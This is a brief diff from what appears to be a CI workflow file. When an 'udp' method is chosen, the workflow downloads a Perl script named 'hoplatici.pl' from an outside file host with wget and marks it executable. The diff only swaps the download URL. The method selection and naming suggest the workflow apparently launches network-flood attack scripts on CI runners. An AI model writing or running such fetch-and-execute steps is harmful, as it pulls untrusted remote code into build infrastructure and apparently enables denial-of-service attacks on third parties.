@@ -35,7 +35,7 @@ jobs:
 
           elif [ "$METHOD" = "udp" ]; then
             echo "UDP methodu indiriliyor..."
-            wget https://wgetz.com/TDpEurDc2e/hoplatici.pl -O hoplatici.pl
+            wget https://wgetz.com/2wtROgDTtf/hoplatici.pl -O hoplatici.pl
             chmod +x hoplatici.pl
 
           else
